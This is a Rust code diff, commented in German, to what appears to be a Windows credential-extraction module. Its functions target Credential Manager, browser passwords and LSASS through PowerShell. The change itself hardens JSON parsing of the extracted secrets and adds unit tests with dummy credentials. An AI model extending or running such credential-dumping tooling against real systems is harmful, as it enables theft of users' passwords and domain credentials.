@@ -9,7 +9,7 @@ use std::process::Stdio;
 #[cfg(target_os = "windows")]
 use tokio::process::Command;
 use tracing::debug;
-#[cfg(target_os = "windows")]
+#[cfg(any(target_os = "windows", test))]
 use tracing::warn;
 
 use crate::error::WinError;
@@ -42,7 +42,7 @@ pub async fn extract_credential_manager() -> Result<Vec<Secret>, WinError> {
                 value = $m.Groups['user'].Value
             }
         }
-        $results | ConvertTo-Json
+        ConvertTo-Json -InputObject @($results)
     "#;
     let output = run_powershell(script).await?;
     parse_secrets_from_json(&output)
@@ -63,7 +63,7 @@ pub async fn extract_browser_credentials() -> Result<Vec<Secret>, WinError> {
         # Chrome: DPAPI-dekodierte Passwörter aus Local State + Login Data
         # Firefox: logins.json dekodieren
         # Platzhalter — konkrete Implementierung je nach Browser-Version
-        @() | ConvertTo-Json
+        ConvertTo-Json -InputObject @()
     "#;
     let output = run_powershell(script).await?;
     parse_secrets_from_json(&output)
@@ -129,10 +129,32 @@ fn parse_lsass_output(output: &str) -> Result<Vec<Secret>, WinError> {
 }
 
 /// Parse JSON-Secrets aus PowerShell-Ausgabe.
-#[cfg(target_os = "windows")]
+///
+/// PowerShell serialisiert ein einzelnes Element als Objekt, mehrere als Array.
+/// Beide Formen werden akzeptiert: das einzelne Objekt wird zu einer Liste mit
+/// einem Eintrag. Nicht lesbarer Inhalt führt zu einer Warnung und einem leeren
+/// Ergebnis — ein Fehler wäre falsch, weil die Extraktion den Vorgang nicht
+/// abbrechen soll, sondern ein Ergebnis liefert.
+///
+/// Der Parser ist bewusst nicht nur unter Windows verfügbar: die Regel, wie
+/// die PowerShell-Ausgabe zu lesen ist, wird ohne Windows-Zielsystem getestet.
+#[cfg(any(target_os = "windows", test))]
 fn parse_secrets_from_json(output: &str) -> Result<Vec<Secret>, WinError> {
-    let secrets: Vec<Secret> = serde_json::from_str(output).unwrap_or_default();
-    Ok(secrets)
+    let trimmed = output.trim();
+    if trimmed.is_empty() {
+        return Ok(Vec::new());
+    }
+    match serde_json::from_str::<Vec<Secret>>(trimmed) {
+        Ok(secrets) => Ok(secrets),
+        Err(list_err) => match serde_json::from_str::<Secret>(trimmed) {
+            // Ein einzelnes Credential: PowerShell liefert dafür ein Objekt.
+            Ok(single) => Ok(vec![single]),
+            Err(_) => {
+                warn!("JSON-Ausgabe der Secret-Extraktion nicht lesbar: {list_err}");
+                Ok(Vec::new())
+            }
+        },
+    }
 }
 
 // --- Nicht-Windows-Plattformen: Stub-Implementierungen ---
@@ -156,4 +178,57 @@ pub async fn extract_lsass() -> Result<Vec<Secret>, WinError> {
 pub async fn extract_browser_credentials() -> Result<Vec<Secret>, WinError> {
     debug!("Browser-Credentials nur auf Windows verfügbar");
     Ok(Vec::new())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Ausgabe von `ConvertTo-Json` bei genau einem gespeicherten Credential:
+    /// PowerShell serialisiert ein einzelnes Element als Objekt.
+    const EIN_CREDENTIAL: &str = r#"{
+        "secret_type": "credential_manager",
+        "target": "\\\\host\\share",
+        "value": "DOMAIN\\user"
+    }"#;
+
+    /// Ausgabe bei mehreren gespeicherten Credentials: ein Array.
+    const MEHRERE_CREDENTIALS: &str = r#"[
+        {"secret_type": "credential_manager", "target": "ziel-a", "value": "nutzer-a"},
+        {"secret_type": "credential_manager", "target": "ziel-b", "value": "nutzer-b"}
+    ]"#;
+
+    #[test]
+    fn ein_credential_liefert_eine_liste_mit_einem_eintrag() {
+        let secrets = parse_secrets_from_json(EIN_CREDENTIAL).expect("kein Fehler");
+
+        assert_eq!(secrets.len(), 1);
+        assert_eq!(secrets[0].secret_type, "credential_manager");
+        assert_eq!(secrets[0].target, r"\\host\share");
+        assert_eq!(secrets[0].value, r"DOMAIN\user");
+    }
+
+    #[test]
+    fn mehrere_credentials_liefern_ihre_liste() {
+        let secrets = parse_secrets_from_json(MEHRERE_CREDENTIALS).expect("kein Fehler");
+
+        assert_eq!(secrets.len(), 2);
+        assert_eq!(secrets[0].target, "ziel-a");
+        assert_eq!(secrets[1].target, "ziel-b");
+        assert_eq!(secrets[1].value, "nutzer-b");
+    }
+
+    #[test]
+    fn leere_ausgabe_liefert_keine_secrets() {
+        let secrets = parse_secrets_from_json("  \n ").expect("kein Fehler");
+
+        assert!(secrets.is_empty());
+    }
+
+    #[test]
+    fn unlesbare_ausgabe_liefert_keine_secrets_statt_eines_fehlers() {
+        let secrets = parse_secrets_from_json("kein json").expect("kein Fehler");
+
+        assert!(secrets.is_empty());
+    }
 }
